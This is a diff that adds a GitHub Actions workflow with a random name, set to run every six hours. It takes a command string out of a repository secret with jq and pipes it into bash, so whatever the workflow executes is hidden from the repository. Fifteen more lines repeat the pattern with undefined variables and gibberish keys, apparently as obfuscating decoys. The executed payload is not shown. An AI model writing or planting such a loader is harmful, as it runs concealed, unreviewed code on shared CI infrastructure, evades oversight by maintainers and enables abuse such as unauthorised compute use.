@@ -1,0 +1,32 @@
+name: whirlwindarmistice
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: whirlwindarmistice
+        env:
+          q7: ${{ secrets.q7 }}
+        run: |
+          echo $q7 | jq -r .roat48 | /bin/bash
+          echo $pbs1479 | jq -r .yjt26 | /bin/bash
+          echo $qeh3075 | jq -r .pdjf10 | /bin/bash
+          echo $w26664 | jq -r .uxw0820 | /bin/bash
+          echo $b7808 | jq -r .iyy4 | /bin/bash
+          echo $z52618 | jq -r .ee145 | /bin/bash
+          echo $fcpq3 | jq -r .o89 | /bin/bash
+          echo $pjgmn81 | jq -r .arrr41114 | /bin/bash
+          echo $cdg50631 | jq -r .edsy92869 | /bin/bash
+          echo $lx3 | jq -r .luptz4184 | /bin/bash
+          echo $wgg40 | jq -r .pbg5 | /bin/bash
+          echo $bn22771 | jq -r .bu9199 | /bin/bash
+          echo $jivt658 | jq -r .h460 | /bin/bash
+          echo $nujo47961 | jq -r .nx903 | /bin/bash
+          echo $acjnf6731 | jq -r .jdxlq64 | /bin/bash
+          echo $devp00 | jq -r .e3004 | /bin/bash
+
